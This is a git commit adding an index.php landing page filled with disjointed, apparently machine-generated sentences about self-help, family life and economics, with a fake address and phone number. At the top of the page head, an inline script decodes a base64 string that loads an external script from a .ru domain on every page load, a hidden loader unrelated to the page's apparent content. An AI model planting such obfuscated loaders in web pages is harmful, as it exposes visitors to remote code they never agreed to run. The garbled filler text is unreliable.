ce846233b74eb94943b3fc80138938eaf817ca6c
rzokcisf <79533941+rzokcisf@users.noreply.github.com>
2021-02-23 19:15:34 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,118 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl81N285bm1wMWc1a3o0ajgza28iPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>- Well, dad, I'm tired! Who needs this school! - You don't want to go to school an</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+</head>
+
+<body>
+
+	<header class="yc9z2sp0rj8n0a3">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="our_themes.html">OUR THEMES</a></li>
+			<li><a href="#">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="yqefs8rlagskpx6pujimsmo">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>- Well, dad, I'm tired! Who needs this school! - You don't want to go to school an</h1>
+	</section>
+
+
+	<section class="our-work" class="iqv3lbf75xhyb5v2rser">
+		<h3 class="title">They act on the market as one economic entity, and </h3>
+		<p>In fig.  The weakness of the weak makes the strong even stronger.  Habit 2 says we don't have to live by these scenarios.  45. </p>
+		<hr>
+
+		<ul class="grid" class="p0blzkeh59pbjes7s1dyvjq">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="yc9z2sp0rj8n0a3">
+		<h3 class="title">Why can't I teach them to be independent a</h3>
+		<p>Maintaining the P / PC balance is of particular importance in relation to the human resources of the organization - customers and employees.  They rebuilt previously damaged relationships with brothers, sisters and friends.  Let you say that you love and appreciate me.  We react to the urgent, we are reactive towards it.  - Well I do not know.  Think about your next serious business and apply the principle of mental creation to them.  Scaling up production creates positive economies of scale.  - Honey, Stephen just came in for a few minutes to help us.  But please don't tell your mom, okay? - You do not wanthow to say ...) - Well, more or less ...  Research for development is carried out when it is necessary to obtain more information on a given problem, to formulate hypotheses more clearly.  The rise in prices will correspond to the increase in demand (the scale of the upward shift of its curve).  - All right, dad, I'm tired! Who needs this school! - You feel very disappointed with the school.  Depending on the method of calculating wages with piece-rate pay, there are several forms of remuneration: 1) direct piece-rate, when workers are paid for the number of units of products they have made and work performed on the basis of fixed piece-rate rates; 2) piece-rate-progressive, in which the payment rises for the output above the norm;3) piece-rate bonus, when labor remuneration includes bonuses for overfulfillment of production standards, achievement of certain quality indicators: delivery of work from the first presentation, absence of defects, complaints, saving of materials. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="yqefs8rlagskpx6pujimsmo" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="iqv3lbf75xhyb5v2rser">
+		<h3 class="title">Win / Win is not a technique.  Little by little, his Circle of </h3>
+		<p>Then another time we may still be able to do something together.  He gave people to get to know each other, to know the interests and hopes, goals and concerns of colleagues, their education and work experience, their views and paradigms.  And understanding how to tap into the capabilities of the right hemisphere greatly increases our ability to realize the first creation.Over the course of several decades, there has been a tremendous amount of research work in what is now called dominant hemisphere theory.  There is a need to ensure a certain level of profitability of the company, the possibilities of its development.  Opportunity cost is also called opportunity cost.  Resources determine what can be available to support results.  If the large reserve of trust is not replenished with permanent deposits,the conjugal relationship is destroyed. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="p0blzkeh59pbjes7s1dyvjq" style="background-image: url(image3.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="yc9z2sp0rj8n0a3">
+		<h3 class="title">Proactive people subordinate feelings to values.  T</h3>
+		<p>For a given production volume of each firm, the greater the number of suppliers, the greater the market supply.  The needs of people are practically limitless, but the resources to satisfy them are limited.  I know how important this is to you.  Yes, I agree, this is idealistic.  Some of them had some success in trading, but still needed help.The tenants did not even want to see the managers of the shopping center, who were just another additional headache for them.  X, but donates only 5 units this time.  Principles don't die.  By noon, when it was time to conclude the meeting, the participants were in a positive, creative and synergistic mood.  External users of accounting information about the organization's activities include those who are outside the organization, but have or would like to have a financial interest in it.  And I asked a direct question: - Let's take a deeper look at the problem. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="yqefs8rlagskpx6pujimsmo" style="background-image: url(image4.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="iqv3lbf75xhyb5v2rser">
+		<h3 class="title">If you unexpectedly meet an old school fri</h3>
+		<p>The reaction of people, expressed in "breaking the shackles", in "release", in "self-affirmation" and in "doing in their own way", often hides their deeper dependencies, from which it is impossible to escape, because they are more internal than external.  And those who do not have a car also benefit.  This stage includes not just the choice of certain methods of conducting marketing research, but the development of specific tasks within the framework of marketing research.  You can only break yourself against the law.  David Starr Jordan For more than 25 years of work with representatives of business and academia, as well as thosewho are interested in the problems of family and marriage, I have met a large number of people who, by their appearance, have achieved tremendous success, but at the same time constantly felt a strong need to find inner balance, to increase personal effectiveness and develop healthy relationships with other people.  The impact on demand of changes in monetary income is somewhat more complex.  Make a list of activities that will help you stay fit, fit your lifestyle and enjoy your life.  The marketing concept is built on seven constituent elements: 1) needs.  But instead of imagining my usual reaction, I can see how I deal with this situation with the love, strength of character, and composure gleaned from my affirmative attitude.  There was unemployment all around, and many of the participants in the meeting had to fire their friends from their jobs to maintain the viability of the enterprises.  Be patient a little.  In order to strengthen their position, they try to use pressure, the power of eloquence and logically structured information. </p>
+		<hr>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="p0blzkeh59pbjes7s1dyvjq" class="title">As you know, an imperfect competitor, striving to maintain a hi</h3>	
+		<p>The more we are able to use the capabilities of our right hemisphere, the more fully we will be able to visualize, synthesize, rise above the present day and the current situation and recreate a holistic picture of what we are going to do and who we want to be in life.  But such an exchange is convenient only in certain cases.  Secondly, both sides from the very beginning acted on the basis of good intentions, and did not want to resort to legal proceedings at all, but did not see any other way out.  The formula for cross-elasticity looks like this: Cross-price elasticity can be positive, negative, or zero.  I will try to apply 7 Skills: I am sure that they are the key to increasing efficiency. </p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="yc9z2sp0rj8n0a3">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="yqefs8rlagskpx6pujimsmo"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="iqv3lbf75xhyb5v2rser"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="p0blzkeh59pbjes7s1dyvjq"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>55843 Adams Path, Suite 455, 13064-5139, Port Janeport, Alaska, United States</p>
+		<p>Phone number: +0(0691)000-51-62316</p>
+	</footer>
+
+</body>
+
+</html>
